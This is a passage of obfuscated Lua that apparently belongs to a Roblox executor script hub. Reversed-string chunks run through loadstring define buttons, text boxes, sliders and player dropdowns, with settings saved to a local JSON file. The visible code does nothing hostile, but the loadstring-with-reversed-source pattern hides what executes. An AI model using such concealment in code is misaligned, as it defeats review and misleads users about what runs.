egasseMrorre ro egasseMretfa dna sseccus = wohSoTegassem lacol		

dne		
dne			
tluser = sseccus				
neht lin =~ tluser fi			
)(kcabllac = tluser lacol			
neht kcabllac fi		
eurt = sseccus lacol		
eurt = gnissecorPsi		
)(kcabllaCetucexe noitcnuf lacol	

dne	
roloCtxeTlanigiro = 3roloCtxeT.txet		
txeTlanigiro = txeT.txet		
dne		
)0 ,1 ,0 ,0(wen.2miDU = eziS.raBllif			
neht lausiVdloh dna raBllif fi		
0 = ssergorPdloh		
dne		
lin = noitcennoCdloh			
)(tcennocsiD:noitcennoCdloh			
neht noitcennoCdloh fi		
eslaf = gnidloh		
)(dloHpots noitcnuf lacol	

dne	
dne		
dne			
))b(rebmunot ,)g(rebmunot ,)r(rebmunot(BGRmorf.3roloC = roloCdloh				
neht b dna g dna r fi			
)")+d%(*s%,)+d%(*s%,)+d%("(hctam:roloCtxeTdloh = b ,g ,r lacol			
esle		
roloCtegrat = roloCdloh			
neht "roloCemarf" == roloCtxeTdloh fi		
neht roloCtxeTdloh fi	
roloCtegrat = roloCdloh lacol	

)"rabllif"(dlihCtsriFdniF:nottub = raBllif lacol	
lin = noitcennoCdloh lacol	
0 = ssergorPdloh lacol	
eslaf = gnidloh lacol	

eslaf = gnissecorPsi lacol	
lin = ksaTmrifnoc lacol	
eslaf = gnimrifnoCsi lacol	
3roloCtxeT.txet = roloCtxeTlanigiro lacol	
txeT.txet = txeTlanigiro lacol	

dne nruter neht txet ton fi	

)"txet"(dlihCtsriFdniF:nottub = txet lacol	
)eurt ,"ekortSeniltuo"(dlihCtsriFdniF:nottub = ekortSeniltuo lacol	

dne nruter neht nottub ton fi	
)"nottub"(dlihCtsriFdniF:emarf = nottub lacol	

dne nruter neht emarf ton fi	
)emaNemarf(dlihCtsriFdniF:tneraP.tpircSxobpuorg = emarf lacol	

roloctxetdloh.gifnoc = roloCtxeTdloh lacol	
eslaf ro lausivdloh.gifnoc = lausiVdloh lacol	
txetdloh.gifnoc = txeTdloh lacol	
emitdloh.gifnoc = emiTdloh lacol	
egasseMrorre.gifnoc = egasseMrorre lacol	
eslaf ro retfAgniruDkcilCnac.gifnoc = retfAgniruDkcilCnac lacol	
2 ro tiaWegasseMretfa.gifnoc = tiaWegasseMretfa lacol	
egasseMretfa.gifnoc = egasseMretfa lacol	
1 ro tiaWmrifnoc.gifnoc = tiaWmrifnoc lacol	
"?erus uoy erA" ro egasseMmrifnoc.gifnoc = egasseMmrifnoc lacol	
eslaf ro mrifnoCsdeen.gifnoc = mrifnoCsdeen lacol	
kcabllac.gifnoc = kcabllac lacol	
pitloot.gifnoc = txeTpitloot lacol	
xobpuorg.gifnoc = tpircSxobpuorg lacol	
emarf.gifnoc = emaNemarf lacol	
)gifnoc(nottuBetaerC noitcnuf lacol

3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol

dne nruter neht emarFroloc ton fi
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol

)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol

dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol
]]):reverse())();
end;
task.spawn(C_3f3);
local function C_3f4()
local script = _llza[_sc(51,102,52)];
loadstring(([[xobtxeTetaerC = xobtxeTetaerC.G_
dne
dne	
)dne		
dne			
)(pitlooTediH.G_				
neht pitlooTediH.G_ fi			
)(ekortSetadpu			
eslaf = gnirevoHsi			
)(noitcnuf(tcennoC:evaeLesuoM.xobtxet		
)dne		
dne			
)txeTpitloot(pitlooTwohS.G_				
dne				
)elacs / )21 + Y.tesnIiug - Y.soPesuom( ,0 ,elacs / )21 + X.tesnIiug - X.soPesuom( ,0(wen.2miDU = noitisoP.pitloot					
neht pitloot fi				
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol				
1 ro elacS.elacSiu dna elacSiu = elacs lacol				
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol				
)(tesnIiuGteG:)"ecivreSiuG"(ecivreSteG:emag = tesnIiug lacol				
)(noitacoLesuoMteG:ecivreStupnIresU = soPesuom lacol				
neht pitlooTwohS.G_ dna txeTpitloot fi			
)(ekortSetadpu			
eurt = gnirevoHsi			
)(noitcnuf(tcennoC:retnEesuoM.xobtxet		
)dne		
)(ekortSetadpu			
eslaf = desucoFsi			
)(noitcnuf(tcennoC:tsoLsucoF.xobtxet		
)dne		
)(ekortSetadpu			
eurt = desucoFsi			
)(noitcnuf(tcennoC:desucoF.xobtxet		
dne		
dne			
1 = xednIZ.ekortSeniltuo				
ycnerapsnarTlanigiro = ycnerapsnarT.ekortSeniltuo				
ssenkcihTlanigiro = ssenkcihT.ekortSeniltuo				
roloClanigiro = roloC.ekortSeniltuo				
esle			
99 = xednIZ.ekortSeniltuo				
0 = ycnerapsnarT.ekortSeniltuo				
1 = ssenkcihT.ekortSeniltuo				
roloCtegrat = roloC.ekortSeniltuo				
neht gnirevoHsi ro desucoFsi fi			
)(ekortSetadpu noitcnuf lacol		
eslaf = desucoFsi lacol		
eslaf = gnirevoHsi lacol		
1 = xednIZ.ekortSeniltuo		
ycnerapsnarT.ekortSeniltuo = ycnerapsnarTlanigiro lacol		
ssenkcihT.ekortSeniltuo = ssenkcihTlanigiro lacol		
roloC.ekortSeniltuo = roloClanigiro lacol		
neht )"ekortSIU"(AsI:ekortSeniltuo dna ekortSeniltuo dna roloCrevoh fi	
)dne	
dne		
)txeT.xobtxet(kcabllac			
neht kcabllac fi		
)(gifnoCevas		
txeT.xobtxet = ]yeKgifnoc[ataDgifnoC.G_		
)(noitcnuf(tcennoC:tsoLsucoF.xobtxet	
dne	
dne		
)dne			
)]yeKgifnoc[ataDgifnoC.G_(kcabllac				
)(noitcnuf(nwaps.ksat			
neht kcabllac fi		
		

]yeKgifnoc[ataDgifnoC.G_ = txeT.xobtxet		
neht ]yeKgifnoc[ataDgifnoC.G_ fi	
emaNxobtxet .. "_" .. emaNemarf = yeKgifnoc lacol	

)}roloCxobtxeTetadpu = etadpu{ ,sexobtxeTlla(tresni.elbat	
)(roloCxobtxeTetadpu	

dne	
dne		
roloc = 3roloCredlohecalP.xobtxet			
roloc = 3roloCtxeT.xobtxet			
neht roloc fi		
)(roloCxobtxeTteg = roloc lacol		
)(roloCxobtxeTetadpu noitcnuf lacol	

dne	
lin nruter		
dne		
dne			
dne				
))b(rebmunot ,)g(rebmunot ,)r(rebmunot(BGRmorf.3roloC nruter					
neht b dna g dna r fi				
)")+d%(*s%,)+d%(*s%,)+d%("(hctam:roloCxobtxet = b ,g ,r lacol				
esle			
roloCtegrat nruter				
neht "roloCemarf" == roloCxobtxet fi			
neht roloCxobtxet fi		
)(roloCxobtxeTteg noitcnuf lacol	

)eurt ,"ekortSeniltuo"(dlihCtsriFdniF:emarFxobtxet = ekortSeniltuo lacol	
dne nruter neht )"xoBtxeT"(AsI:xobtxet ton ro xobtxet ton fi	
)"xobtxet"(dlihCtsriFdniF:emarFxobtxet = xobtxet lacol	
dne nruter neht emarFxobtxet ton fi	
)emaNxobtxet(dlihCtsriFdniF:emarf = emarFxobtxet lacol	
dne nruter neht emarf ton fi	
)eurt ,emaNemarf(dlihCtsriFdniF:iuGneercs = emarf lacol	
kcabllac.gifnoc = kcabllac lacol	
rolocrevoh.gifnoc = roloCrevoh lacol	
rolocxobtxet.gifnoc = roloCxobtxet lacol	
pitloot.gifnoc = txeTpitloot lacol	
emanxobtxet.gifnoc = emaNxobtxet lacol	
emarf.gifnoc = emaNemarf lacol	
)gifnoc(xobtxeTetaerC noitcnuf lacol
)(gifnoCdaol
dne
dne	
)atad(edoceDNOSJ:ecivreSpttH = ataDgifnoC.G_		
neht atad dna sseccus fi	
)dne	
)ELIF_GIFNOC(elifdaer nruter		
)(noitcnuf(llacp = atad ,sseccus lacol	
)(gifnoCdaol noitcnuf lacol
dne
)dne	
))ataDgifnoC.G_(edocnENOSJ:ecivreSpttH ,ELIF_GIFNOC(elifetirw		
)(noitcnuf(llacp	
)(gifnoCevas noitcnuf lacol
"nosj.gifnocym" = ELIF_GIFNOC lacol
}{ ro ataDgifnoC.G_ = ataDgifnoC.G_

)sroloCllAetadpu(tcennoC:)"3roloCdnuorgkcaB"(langiSdegnahCytreporPteG:emarFroloc

dne
dne	
)(etadpu.xobtxet		
od )sexobtxeTlla(sriap ni xobtxet ,_ rof	
3roloCdnuorgkcaB.emarFroloc = roloCtegrat	
)(sroloCllAetadpu noitcnuf lacol

}{ = sexobtxeTlla lacol

3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol
dne nruter neht emarFroloc ton fi
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol
)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol
]]):reverse())();
end;
task.spawn(C_3f4);
local function C_3f5()
local script = _llza[_sc(51,102,53)];
loadstring(([[redilSetaerC = redilSetaerC.G_

dne
)eulaVtnerruc(redilSetadpu	

dne	
)dne		
dne			
)(pitlooTediH.G_				
neht pitlooTediH.G_ fi			
1 = xednIZ.ekortSeniltuo			
ycnerapsnarTlanigiro = ycnerapsnarT.ekortSeniltuo			
ssenkcihTlanigiro = ssenkcihT.ekortSeniltuo			
roloClanigiro = roloC.ekortSeniltuo			
)(noitcnuf(tcennoC:evaeLesuoM.emarFredils		

)dne		
dne			
)txeTpitloot(pitlooTwohS.G_				
dne				
)elacs / )21 + Y.tesnIiug - Y.soPesuom( ,0 ,elacs / )21 + X.tesnIiug - X.soPesuom( ,0(wen.2miDU = noitisoP.pitloot					
neht pitloot fi				
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol				
1 ro elacS.elacSiu dna elacSiu = elacs lacol				
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol				
)(tesnIiuGteG:)"ecivreSiuG"(ecivreSteG:emag = tesnIiug lacol				
)(noitacoLesuoMteG:ecivreStupnIresU = soPesuom lacol				
neht pitlooTwohS.G_ dna txeTpitloot fi			
99 = xednIZ.ekortSeniltuo			
0 = ycnerapsnarT.ekortSeniltuo			
1 = ssenkcihT.ekortSeniltuo			
roloCtegrat = roloC.ekortSeniltuo			
)(noitcnuf(tcennoC:retnEesuoM.emarFredils		

1 = xednIZ.ekortSeniltuo		
ycnerapsnarT.ekortSeniltuo = ycnerapsnarTlanigiro lacol		
ssenkcihT.ekortSeniltuo = ssenkcihTlanigiro lacol		
roloC.ekortSeniltuo = roloClanigiro lacol		
neht )"ekortSIU"(AsI:ekortSeniltuo dna ekortSeniltuo fi	

)dne	
dne		
)tupni(esuoMmorFetadpu			
neht )hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro tnemevoMesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni( dna gniggard fi		
)tupni(noitcnuf(tcennoC:degnahCtupnI.ecivreStupnIresU	

)dne	
dne		
eslaf = gniggard			
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro 1nottuBesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi		
)tupni(noitcnuf(tcennoC:dednEtupnI.emarFredils	

)dne	
dne		
)tupni(esuoMmorFetadpu			
eurt = gniggard			
neht hcuoT.epyTtupnIresU.munE == epyTtupnIresU.tupni ro 1nottuBesuoM.epyTtupnIresU.munE == epyTtupnIresU.tupni fi		
)tupni(noitcnuf(tcennoC:nageBtupnI.emarFredils	

dne	
)eulav(redilSetadpu		

))eulaVnim - eulaVxam( * egatnecrep( + eulaVnim = eulav lacol		
)1 ,0 ,X.ezis / )X.sop - Xesuom((pmalc.htam = egatnecrep lacol		

X.noitisoP.tupni = Xesuom lacol		
eziSetulosbA.emarFredils = ezis lacol		
noitisoPetulosbA.emarFredils = sop lacol		
)tupni(esuoMmorFetadpu noitcnuf lacol	

dne	
dne		
)eulav(kcabllac			
neht kcabllac fi		

)(gifnoCevas		
eulav = ]emaNemarf[ataDgifnoC.G_		

dne		
)eulaVxam(eulaVtamrof .. " / " .. )eulav(eulaVtamrof = txeT.txet			
esle		
"fni / " .. )eulaVnim(eulaVtamrof = txeT.txet			
neht eguh.htam == eulaVtsehgih dna eulaVxam => eulav fi		

)0 ,1 ,0 ,)1 ,0 ,egatnecrep(pmalc.htam(wen.2miDU = eziS.raBllif		
)eulaVnim - eulaVxam( / )eulaVnim - eulav( = egatnecrep lacol		

eulav = eulaVtnerruc		

dne		
eulaVtsehgih = eulav			
neht eulaVxam > eulaVtsehgih dna eulaVxam => eulav fi		

dne		
tnemercnIpans * )5.0 + tnemercnIpans / eulav(roolf.htam = eulav			
secalPlamiced- ^ 01 = tnemercnIpans lacol			
neht pans fi		

)eulaVxam ,eulaVnim ,eulav(pmalc.htam = eulav		
)eulav(redilSetadpu noitcnuf lacol	

dne	
dne		
)eulav ,"f" .. secalPlamiced .. ".%"(tamrof.gnirts nruter			
esle		
)eulav(gnirtsot nruter			
neht eguh.htam == secalPlamiced fi		
)eulav(eulaVtamrof noitcnuf lacol	

dne	
)(gifnoCevas		
eulaVtnerruc = ]emaNemarf[ataDgifnoC.G_		
eulaVnim ro eulaVtluafed = eulaVtnerruc		
neht eulaVtnerruc ton fi	

]emaNemarf[ataDgifnoC.G_ = eulaVtnerruc lacol	
eslaf = gniggard lacol	

)}roloCraBlliFetadpu = etadpu{ ,sredilSlla(tresni.elbat	

dne	
3roloCdnuorgkcaB.emarFroloc = 3roloCdnuorgkcaB.raBllif		
)(roloCraBlliFetadpu noitcnuf lacol	

3roloCdnuorgkcaB.emarFroloc = 3roloCdnuorgkcaB.raBllif	

dne nruter neht txet ton ro raBllif ton fi	

)eurt ,"ekortSeniltuo"(dlihCtsriFdniF:emarFredils = ekortSeniltuo lacol	
)"txet"(dlihCtsriFdniF:nottub = txet lacol	
)"rabllif"(dlihCtsriFdniF:emarFredils = raBllif lacol	

dne nruter neht emarFredils ton fi	
)"emarFredils"(dlihCtsriFdniF:nottub = emarFredils lacol	

dne nruter neht nottub ton fi	
)"nottub"(dlihCtsriFdniF:emarf = nottub lacol	

dne nruter neht emarf ton fi	
)emaNemarf(dlihCtsriFdniF:tneraP.tpircSxobpuorg = emarf lacol	

dne nruter neht eulaVxam ton fi	

tluafed.gifnoc = eulaVtluafed lacol	
eslaf ro pans.gifnoc = pans lacol	
0 ro secalplamiced.gifnoc = secalPlamiced lacol	
eulaVxam ro eulavtsehgih.gifnoc = eulaVtsehgih lacol	
eulavxam.gifnoc = eulaVxam lacol	
0 ro eulavnim.gifnoc = eulaVnim lacol	
kcabllac.gifnoc = kcabllac lacol	
pitloot.gifnoc = txeTpitloot lacol	
xobpuorg.gifnoc = tpircSxobpuorg lacol	
emarf.gifnoc = emaNemarf lacol	
)gifnoc(redilSetaerC noitcnuf lacol

)(gifnoCdaol

dne
dne	
)atad(edoceDNOSJ:ecivreSpttH = ataDgifnoC.G_		
neht atad dna sseccus fi	
)dne	
)ELIF_GIFNOC(elifdaer nruter		
)(noitcnuf(llacp = atad ,sseccus lacol	
)(gifnoCdaol noitcnuf lacol

dne
)dne	
))ataDgifnoC.G_(edocnENOSJ:ecivreSpttH ,ELIF_GIFNOC(elifetirw		
)(noitcnuf(llacp	
)(gifnoCevas noitcnuf lacol

"nosj.gifnocym" = ELIF_GIFNOC lacol

}{ ro ataDgifnoC.G_ = ataDgifnoC.G_

)sroloCllAetadpu(tcennoC:)"3roloCdnuorgkcaB"(langiSdegnahCytreporPteG:emarFroloc

dne
dne	
)(etadpu.redils		
od )sredilSlla(sriap ni redils ,_ rof	
3roloCdnuorgkcaB.emarFroloc = roloCtegrat	
)(sroloCllAetadpu noitcnuf lacol

}{ = sredilSlla lacol

3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol

dne nruter neht emarFroloc ton fi
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol

)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH lacol
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol

dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol
]]):reverse())();
end;
task.spawn(C_3f5);
local function C_3f6()
local script = _llza[_sc(51,102,54)];
loadstring(([[nwodporDetaerC = nwodporDetaerC.G_
dne
)(txeTetadpu	
dne	
eslaf = elbisiV.sresUnwodpord		
neht sresUnwodpord fi	
dne	
eslaf = elbisiV.llAtceleSnwodpord		
neht llAtceleSnwodpord fi	
eslaf = elbisiV.etalpmeTnottub	
eslaf = elbisiV.tsiLnwodpord	
081 = noitatoR.worra	
eurt = elbisiV.emarFnwodpord	
eurt = elbisiV.worra	
eslaf = elbisiV.hcraes	
eurt = elbisiV.txet	
dne	
)dne		
dne			
)"" ro txeT.hcraes dna rabhcraeSsah(tsiLdliub				
neht nepOsi fi			
dne			
)(gifnoCevas				
lin = ]yeKgifnoc[ataDgifnoC.G_				
)(txeTetadpu				
lin = elgniSdetceles				
neht emaN.reyalp == elgniSdetceles fiesle			
)(gifnoCevas				
smetIdetceles = ]yeKgifnoc[ataDgifnoC.G_				
)(txeTetadpu				
lin = ]emaN.reyalp[smetIdetceles				
neht ]emaN.reyalp[smetIdetceles dna tceleSitlum fi			
)reyalp(noitcnuf(tcennoC:gnivomeRreyalP.sreyalP		
)dne		
dne			
)"" ro txeT.hcraes dna rabhcraeSsah(tsiLdliub				
neht nepOsi fi			
)(noitcnuf(tcennoC:deddAreyalP.sreyalP		
neht "sreyalp" == epyTnwodpord fi	
dne	
)dne		
dne			
)(pitlooTediH.G_				
neht pitlooTediH.G_ fi			
1 = xednIZ.ekortSeniltuo			
ycnerapsnarTlanigiro = ycnerapsnarT.ekortSeniltuo			
ssenkcihTlanigiro = ssenkcihT.ekortSeniltuo			
roloClanigiro = roloC.ekortSeniltuo			
)(noitcnuf(tcennoC:evaeLesuoM.nottub		
)dne		
dne			
)txeTpitloot(pitlooTwohS.G_				
dne				
)elacs / )21 + Y.tesnIiug - Y.soPesuom( ,0 ,elacs / )21 + X.tesnIiug - X.soPesuom( ,0(wen.2miDU = noitisoP.pitloot					
neht pitloot fi				
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol				
1 ro elacS.elacSiu dna elacSiu = elacs lacol				
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol				
)(tesnIiuGteG:)"ecivreSiuG"(ecivreSteG:emag = tesnIiug lacol				
)(noitacoLesuoMteG:ecivreStupnIresU = soPesuom lacol				
neht pitlooTwohS.G_ dna txeTpitloot fi			
99 = xednIZ.ekortSeniltuo			
0 = ycnerapsnarT.ekortSeniltuo			
1 = ssenkcihT.ekortSeniltuo			
roloCtegrat = roloC.ekortSeniltuo			
)(noitcnuf(tcennoC:retnEesuoM.nottub		
		
		
1 = xednIZ.ekortSeniltuo		
ycnerapsnarT.ekortSeniltuo = ycnerapsnarTlanigiro lacol		
ssenkcihT.ekortSeniltuo = ssenkcihTlanigiro lacol		
roloC.ekortSeniltuo = roloClanigiro lacol		
neht )"ekortSIU"(AsI:ekortSeniltuo dna ekortSeniltuo fi	
)dne	
dne		
)(noitisoPnwodporDetadpu			
neht nepOsi fi		
)(noitcnuf(tcennoC:)"noitisoPetulosbA"(langiSdegnahCytreporPteG:emarFnwodpord	
dne	
)dne		
dne			
)txeT.hcraes(tsiLdliub				
neht nepOsi fi			
)(noitcnuf(tcennoC:)"txeT"(langiSdegnahCytreporPteG:hcraes		
neht rabhcraeSsah fi	
dne	
)dne		
dne			
)"" ro txeT.hcraes dna rabhcraeSsah(tsiLdliub				
neht nepOsi fi			
"ylnO sdneirF" ro "llA wohS" dna ylnOsdneirFwohs = txeT.ntBsdneirf			
ylnOsdneirFwohs ton = ylnOsdneirFwohs			
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.ntBsdneirf		
neht ntBsdneirf fi	
dne	
)dne		
dne			
)"" ro txeT.hcraes dna rabhcraeSsah(tsiLdliub				
neht nepOsi fi			
"yalpsiD wohS" ro "emanresU wohS" dna semaNyalpsiDwohs = txeT.ntByalpsid			
semaNyalpsiDwohs ton = semaNyalpsiDwohs			
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.ntByalpsid		
neht ntByalpsid fi	
dne	
)dne		
dne			
dne				
)lin(kcabllac					
neht kcabllac fi				
)(gifnoCevas				
lin = ]yeKgifnoc[ataDgifnoC.G_				
)(txeTetadpu				
dne				
dne					
dne						
)552 ,552 ,552(BGRmorf.3roloC = 3roloCtxeT.txeTnoitpo							
neht txeTnoitpo fi						
)"txet"(dlihCtsriFdniF:dlihc = txeTnoitpo lacol						
neht )"_noitpO^"(hctam:emaN.dlihc fi					
od ))(nerdlihCteG:gnillorcSnwodpord(sriap ni dlihc ,_ rof				
lin = elgniSdetceles				
esle			
dne				
)smetIdetceles(kcabllac					
neht kcabllac fi				
)(gifnoCevas				
smetIdetceles = ]yeKgifnoc[ataDgifnoC.G_				
)(txeTetadpu				
dne				
lin = ]eulaVmeti[smetIdetceles					
od )evomeRoTsmeti(sriapi ni eulaVmeti ,_ rof				
dne				
dne					
dne						
)552 ,552 ,552(BGRmorf.3roloC = 3roloCtxeT.txeTnoitpo							
)eulaVmeti ,evomeRoTsmeti(tresni.elbat							
txeT.txeTnoitpo ro )"eulaVmetI"(etubirttAteG:dlihc = eulaVmeti lacol							
neht txeTnoitpo fi						
)"txet"(dlihCtsriFdniF:dlihc = txeTnoitpo lacol						
neht )"_noitpO^"(hctam:emaN.dlihc fi					
od ))(nerdlihCteG:gnillorcSnwodpord(sriap ni dlihc ,_ rof				
}{ = evomeRoTsmeti lacol				
neht tceleSitlum fi			
dne nruter neht nepOsi ton fi			
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.ntBllAtcelesnu		
neht ntBllAtcelesnu fi	
dne	
)dne		
dne			
dne				
dne					
dne						
)elgniSdetceles(kcabllac							
esle						
)maet(kcabllac							
)elgniSdetceles(dlihCtsriFdniF:smaeT = maet lacol							
neht "smaet" == epyTnwodpord fiesle						
)reyalp(kcabllac							
)elgniSdetceles(dlihCtsriFdniF:sreyalP = reyalp lacol							
neht "sreyalp" == epyTnwodpord fi						
neht kcabllac fi					
)(gifnoCevas					
elgniSdetceles = ]yeKgifnoc[ataDgifnoC.G_					
)(txeTetadpu					
dne					
roloCtegrat = 3roloCtxeT.txeTnoitpo						
txeT.txeTnoitpo ro )"eulaVmetI"(etubirttAteG:dlihCtsrif = elgniSdetceles						
neht txeTnoitpo fi					
)"txet"(dlihCtsriFdniF:dlihCtsrif = txeTnoitpo lacol					
]1[smetItnerruc = dlihCtsrif lacol					
neht 0 > smetItnerruc# fi				
esle			
dne				
)smetIdetceles(kcabllac					
neht kcabllac fi				
)(gifnoCevas				
smetIdetceles = ]yeKgifnoc[ataDgifnoC.G_				
)(txeTetadpu				
dne				
dne					
roloCtegrat = 3roloCtxeT.txeTnoitpo						
eurt = ]eulaVmeti[smetIdetceles						
txeT.txeTnoitpo ro )"eulaVmetI"(etubirttAteG:dlihc = eulaVmeti lacol						
neht txeTnoitpo fi					
)"txet"(dlihCtsriFdniF:dlihc = txeTnoitpo lacol					
od )smetItnerruc(sriapi ni dlihc ,_ rof				
neht tceleSitlum fi			
dne			
dne				
)dlihc ,smetItnerruc(tresni.elbat					
neht )"_noitpO^"(hctam:emaN.dlihc fi				
od ))(nerdlihCteG:gnillorcSnwodpord(sriap ni dlihc ,_ rof			
}{ = smetItnerruc lacol			
dne nruter neht nepOsi ton fi			
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.ntBllAtceles		
neht ntBllAtceles fi	
)dne	
dne		
)(nwodporDnepo			
esle		
)(nwodporDesolc			
neht nepOsi fi		
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.worra	
)dne	
dne		
)(nwodporDnepo			
esle		
dne			
)(nwodporDesolc				
neht rabhcraeSsah ton fi			
neht nepOsi fi		
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottub	
dne	
dne		
lin = nwodporDnepOtnerruc			
neht nottub == nwodporDnepOtnerruc fi		
081 = noitatoR.worra		
eurt = elbisiV.emarFnwodpord		
eurt = elbisiV.worra		
eslaf = elbisiV.hcraes		
eurt = elbisiV.txet		
eslaf = elbisiV.tsiLnwodpord		
eslaf = nepOsi		
)(nwodporDesolc noitcnuf lacol	
dne	
)""(tsiLdliub		
)(noitisoPnwodporDetadpu		
dne		
"sreyalp" == epyTnwodpord dna snottuBresUwohs = elbisiV.sresUnwodpord			
neht sresUnwodpord fi		
dne		
llAtceleSwohs = elbisiV.llAtceleSnwodpord			
neht llAtceleSnwodpord fi		
dne		
"" = txeT.hcraes			
eurt = elbisiV.hcraes			
eslaf = elbisiV.txet			
neht rabhcraeSsah fi		
nottub = nwodporDnepOtnerruc		
0 = noitatoR.worra		
eurt = elbisiV.tsiLnwodpord		
eurt = nepOsi		
dne		
)(kcilC.nwodporDnepOtnerruc			
neht nottub =~ nwodporDnepOtnerruc dna nwodporDnepOtnerruc fi		
)(nwodporDnepo noitcnuf lacol	
dne	
)(noitisoPnwodporDetadpu		
dne		
gnillorcSnwodpord = tneraP.nottuBnoitpo			
)eulav.meti ,"eulaVmetI"(etubirttAteS:nottuBnoitpo			
)dne			
dne				
lin = nwodporDnepOtnerruc					
081 = noitatoR.worra					
eurt = elbisiV.emarFnwodpord					
eurt = elbisiV.worra					
eslaf = elbisiV.hcraes					
eurt = elbisiV.txet					
eslaf = elbisiV.tsiLnwodpord					
eslaf = nepOsi					
dne					
dne						
)elgniSdetceles(kcabllac							
esle						
)maet(kcabllac							
)eulav.meti(dlihCtsriFdniF:smaeT = maet lacol							
neht "smaet" == epyTnwodpord fiesle						
)reyalp(kcabllac							
)eulav.meti(dlihCtsriFdniF:sreyalP = reyalp lacol							
neht "sreyalp" == epyTnwodpord fi						
neht kcabllac fi					
)(gifnoCevas					
elgniSdetceles = ]yeKgifnoc[ataDgifnoC.G_					
)(txeTetadpu					
dne					
dne						
roloCtegrat = 3roloCtxeT.txeTnoitpo							
neht txeTnoitpo fi						
eulav.meti = elgniSdetceles						
esle					
dne						
)552 ,552 ,552(BGRmorf.3roloC = 3roloCtxeT.txeTnoitpo							
neht txeTnoitpo fi						
lin = elgniSdetceles						
neht eulav.meti == elgniSdetceles fi					
dne					
dne						
dne							
)552 ,552 ,552(BGRmorf.3roloC = 3roloCtxeT.txeTdlihc								
neht txeTdlihc fi							
)"txet"(dlihCtsriFdniF:dlihc = txeTdlihc lacol							
neht )"_noitpO^"(hctam:emaN.dlihc fi						
od ))(nerdlihCteG:gnillorcSnwodpord(sriap ni dlihc ,_ rof					
esle				
dne					
)smetIdetceles(kcabllac						
neht kcabllac fi					
)(gifnoCevas					
smetIdetceles = ]yeKgifnoc[ataDgifnoC.G_					
)(txeTetadpu					
dne					
dne						
dne							
roloCtegrat = 3roloCtxeT.txeTnoitpo								
neht txeTnoitpo fi							
eurt = ]eulav.meti[smetIdetceles							
neht tceleSitluMxam < tnuoc ro tceleSitluMxam ton fi						
dne 1 + tnuoc = tnuoc od )smetIdetceles(sriap ni _ rof						
0 = tnuoc lacol						
esle					
dne						
)552 ,552 ,552(BGRmorf.3roloC = 3roloCtxeT.txeTnoitpo							
neht txeTnoitpo fi						
lin = ]eulav.meti[smetIdetceles						
neht ]eulav.meti[smetIdetceles fi					
neht tceleSitlum fi				
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.ntBnoitpo			
)dne			
01 = xednIZ.nottuBnoitpo				
)05 ,05 ,05(BGRmorf.3roloC = 3roloCredroB.nottuBnoitpo				
)(noitcnuf(tcennoC:evaeLesuoM.ntBnoitpo			
)dne			
99 = xednIZ.nottuBnoitpo				
roloCtegrat = 3roloCredroB.nottuBnoitpo				
)(noitcnuf(tcennoC:retnEesuoM.ntBnoitpo			
dne			
nottuBnoitpo = tneraP.ntBnoitpo				
1 + xednIZ.nottuBnoitpo = xednIZ.ntBnoitpo				
"" = txeT.ntBnoitpo				
1 = ycnerapsnarTdnuorgkcaB.ntBnoitpo				
)0 ,1 ,0 ,1(wen.2miDU = eziS.ntBnoitpo				
neht )"nottuBtxeT"(AsI:nottuBnoitpo ton fi			
)"nottuBtxeT"(wen.ecnatsnI ro nottuBnoitpo dna )"nottuBtxeT"(AsI:nottuBnoitpo = ntBnoitpo lacol			
dne			
dne				
eslaf = elbisiV.egamInoitpo					
esle				
)dne					
)dIresu.meti(bmuhTteg = egamI.egamInoitpo						
)(noitcnuf(nwaps.ksat					
eurt = elbisiV.egamInoitpo					
neht reyalPsi.meti dna nocIreyalp fi				
neht egamInoitpo fi			
dne			
dne				
roloCtegrat = 3roloCtxeT.txeTnoitpo					
neht detceleSsi fi				
)eulav.meti == elgniSdetceles( ro ]eulav.meti[smetIdetceles dna tceleSitlum = detceleSsi lacol				
yalpsid.meti = txeT.txeTnoitpo				
neht txeTnoitpo fi			
